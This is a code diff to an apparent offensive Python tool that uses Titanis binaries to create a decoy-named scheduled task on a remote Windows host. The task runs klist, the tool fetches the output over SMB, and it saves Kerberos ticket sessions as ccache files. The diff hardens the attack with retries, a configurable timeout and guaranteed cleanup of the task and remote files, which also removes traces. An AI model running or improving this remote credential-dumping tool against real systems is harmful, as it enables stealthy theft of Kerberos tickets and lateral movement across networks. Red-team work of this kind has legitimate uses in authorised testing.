@@ -326,31 +326,53 @@ def _build_task_xml(arguments: str) -> bytes:
     return b'\xff\xfe' + body.encode('utf-16-le')
 
 
-def _tsch_create(tsch_bin, task_path, arguments, target, auth_flags, verbose) -> bool:
+def _tsch_ok(stdout, rc):
+    """Titanis exits 0 even on unhandled exceptions; non-empty stdout is
+    the only reliable success signal (Tsch prints the task path on success)."""
+    return rc == 0 and bool(stdout.strip())
+
+
+def _tsch_create(tsch_bin, task_path, arguments, target, auth_flags, verbose,
+                  retries=3) -> bool:
     xml_bytes = _build_task_xml(arguments)
     with tempfile.NamedTemporaryFile(suffix='.xml', mode='wb', delete=False) as f:
         f.write(xml_bytes)
         xml_path = f.name
     try:
         extra = ['-TaskPath', task_path, '-X', xml_path, target]
-        stdout, rc = _run(tsch_bin, 'create', auth_flags, extra, verbose=verbose)
+        for attempt in range(1, retries + 1):
+            stdout, rc = _run(tsch_bin, 'create', auth_flags, extra, verbose=verbose)
+            if _tsch_ok(stdout, rc):
+                return True
+            if attempt < retries:
+                print(f'  [!] Tsch create attempt {attempt}/{retries} failed (rc={rc}), retrying...',
+                      file=sys.stderr)
+                time.sleep(2)
+            else:
+                print(f'  [!] Tsch create failed after {retries} attempts (rc={rc})', file=sys.stderr)
+                if stdout:
+                    print(f'  [!] {stdout.strip()}', file=sys.stderr)
     finally:
         os.unlink(xml_path)
-    if rc != 0:
-        print(f'  [!] Tsch create failed (rc={rc})', file=sys.stderr)
-        if stdout: print(f'  [!] {stdout.strip()}', file=sys.stderr)
-        return False
-    return True
+    return False
 
 
-def _tsch_run(tsch_bin, task_path, target, auth_flags, verbose) -> bool:
+def _tsch_run(tsch_bin, task_path, target, auth_flags, verbose,
+              retries=2) -> bool:
     extra = ['-TaskPath', task_path, target]
-    stdout, rc = _run(tsch_bin, 'run', auth_flags, extra, verbose=verbose)
-    if rc != 0:
-        print(f'  [!] Tsch run failed (rc={rc})', file=sys.stderr)
-        if stdout: print(f'  [!] {stdout.strip()}', file=sys.stderr)
-        return False
-    return True
+    for attempt in range(1, retries + 1):
+        stdout, rc = _run(tsch_bin, 'run', auth_flags, extra, verbose=verbose)
+        if _tsch_ok(stdout, rc):
+            return True
+        if attempt < retries:
+            print(f'  [!] Tsch run attempt {attempt}/{retries} failed (rc={rc}), retrying...',
+                  file=sys.stderr)
+            time.sleep(2)
+        else:
+            print(f'  [!] Tsch run failed after {retries} attempts (rc={rc})', file=sys.stderr)
+            if stdout:
+                print(f'  [!] {stdout.strip()}', file=sys.stderr)
+    return False
 
 
 def _tsch_delete(tsch_bin, task_path, target, auth_flags, verbose):
@@ -399,9 +421,10 @@ def _dump(args, tsch_bin, smb_bin) -> int:
         print('[!] Smb2Client binary not found — run install.sh', file=sys.stderr)
         return 1
 
-    target  = args.target
-    out_dir = args.output or '.'
-    verbose = args.verbose
+    target   = args.target
+    out_dir  = args.output or '.'
+    verbose  = args.verbose
+    deadline_sec = getattr(args, 'timeout', 90) or 90
     os.makedirs(out_dir, exist_ok=True)
 
     task_name, file_name, sessions_name = _make_decoy()
@@ -417,55 +440,75 @@ def _dump(args, tsch_bin, smb_bin) -> int:
     print(f'[*] Target     : {target}')
     print(f'[*] Task path  : {task_name}')
     print(f'[*] Output     : {remote_out}')
+    print(f'[*] Timeout    : {deadline_sec}s')
     print()
 
-    # ── create & run task ─────────────────────────────────────────────────────
-    print('[*] Creating scheduled task ...')
-    if not _tsch_create(tsch_bin, task_name, arguments, target, tsch_auth, verbose):
-        return 1
+    task_created = False
+    local_tmp    = None
 
-    print('[*] Triggering task ...')
-    if not _tsch_run(tsch_bin, task_name, target, tsch_auth, verbose):
-        _tsch_delete(tsch_bin, task_name, target, tsch_auth, verbose)
-        return 1
+    try:
+        # ── create & run task ─────────────────────────────────────────────
+        print('[*] Creating scheduled task ...')
+        if not _tsch_create(tsch_bin, task_name, arguments, target, tsch_auth, verbose):
+            return 1
+        task_created = True
 
-    # ── poll for output file (deadline-based) ─────────────────────────────────
-    with tempfile.NamedTemporaryFile(suffix='.log', delete=False) as tmp:
-        local_tmp = tmp.name
+        print('[*] Triggering task ...')
+        if not _tsch_run(tsch_bin, task_name, target, tsch_auth, verbose):
+            return 1
 
-    print('[*] Waiting for task output ...')
-    ok       = False
-    deadline = time.time() + 45
-    time.sleep(2)
-    attempt  = 0
-    while time.time() < deadline:
-        attempt += 1
-        if verbose:
-            print(f'  [*] SMB read attempt {attempt} ...', file=sys.stderr)
-        if _smb_get(smb_bin, unc_out, local_tmp, smb_auth, verbose):
-            ok = True
-            break
-        time.sleep(3)
+        # ── poll for output file (deadline-based) ─────────────────────────
+        fd, local_tmp = tempfile.mkstemp(suffix='.log')
+        os.close(fd)
 
-    # ── cleanup (best-effort) ─────────────────────────────────────────────────
-    print('[*] Cleaning up ...')
-    if ok:
+        print('[*] Waiting for task output ...')
+        ok       = False
+        deadline = time.time() + deadline_sec
+        time.sleep(2)
+        attempt  = 0
+        while time.time() < deadline:
+            attempt += 1
+            remaining = int(deadline - time.time())
+            if verbose:
+                print(f'  [*] SMB read attempt {attempt} ({remaining}s remaining) ...',
+                      file=sys.stderr)
+            if _smb_get(smb_bin, unc_out, local_tmp, smb_auth, verbose):
+                ok = True
+                break
+            # Back off: 2s initially, growing to 5s
+            time.sleep(min(2 + attempt, 5))
+
+        if not ok:
+            print(f'[-] Timed out after {deadline_sec}s waiting for task output.',
+                  file=sys.stderr)
+            print(f'    The task may still be running on {target}.',
+                  file=sys.stderr)
+            print(f'    Increase timeout: titan klist --timeout 120 ...',
+                  file=sys.stderr)
+            return 1
+
+    finally:
+        # ── cleanup (best-effort, always runs even on Ctrl-C) ─────────────
+        print('[*] Cleaning up ...')
         _smb_rm(smb_bin, unc_out, smb_auth, verbose)
-    # sessions file is deleted by cmd.exe; this catches the rare case it wasn't
-    _smb_rm(smb_bin, unc_sessions, smb_auth, verbose)
-    _tsch_delete(tsch_bin, task_name, target, tsch_auth, verbose)
-
-    if not ok:
-        os.unlink(local_tmp)
-        return 1
+        _smb_rm(smb_bin, unc_sessions, smb_auth, verbose)
+        if task_created:
+            _tsch_delete(tsch_bin, task_name, target, tsch_auth, verbose)
 
     # ── parse ─────────────────────────────────────────────────────────────────
-    with open(local_tmp, 'r', errors='replace') as f:
-        raw = f.read()
-    os.unlink(local_tmp)
+    try:
+        with open(local_tmp, 'r', errors='replace') as f:
+            raw = f.read()
+    finally:
+        if local_tmp and os.path.exists(local_tmp):
+            os.unlink(local_tmp)
 
     if not raw.strip():
         print('[-] Remote command produced no output.', file=sys.stderr)
+        print('    Possible causes: klist.exe not found, AppLocker blocking cmd.exe,',
+              file=sys.stderr)
+        print('    or Task Scheduler service disabled on target.',
+              file=sys.stderr)
         return 1
 
     sessions = _split_sessions(raw)
@@ -528,6 +571,8 @@ def main():
     ap.add_argument('-t', '--target', metavar='HOST')
     ap.add_argument('-o', '--output', metavar='DIR',
                     help='Output directory for ccache files (default: current dir)')
+    ap.add_argument('--timeout', type=int, default=90, metavar='SEC',
+                    help='Seconds to wait for task output (default: 90)')
     ap.add_argument('-v', '--verbose', action='store_true')
 
     add_auth_args(ap)
